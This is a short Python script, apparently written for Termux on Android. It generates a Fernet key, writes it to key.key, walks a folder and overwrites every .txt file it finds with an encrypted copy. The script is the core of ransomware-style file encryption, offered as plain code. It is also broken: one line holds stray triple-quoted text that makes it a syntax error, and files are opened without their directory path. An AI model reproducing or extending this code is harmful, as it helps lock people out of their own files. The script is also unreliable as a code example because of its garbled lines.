from cryptography.fernet import Fernet
import os

key = Fernet.generate_key()

keyinfile=open("key.key","wb")
keyinfile.write(key)

fernet = Fernet(key)

mas ="/data/data/com.termux/files/home/test_txt"
for msar,mjld,file in os.walk(mas):
	for fs2 in file:
		m = fs2.find('.')
		mt=fs2[m:-1]+fs2[-1]
		if mt == ".txt":
			data=open(fs2,"r")"""img = rb"""
			data=data.read()

			encrypted=fernet.encrypt(data.encode())

			fit=open(fs2,"wb")
			fit.write(encrypted)
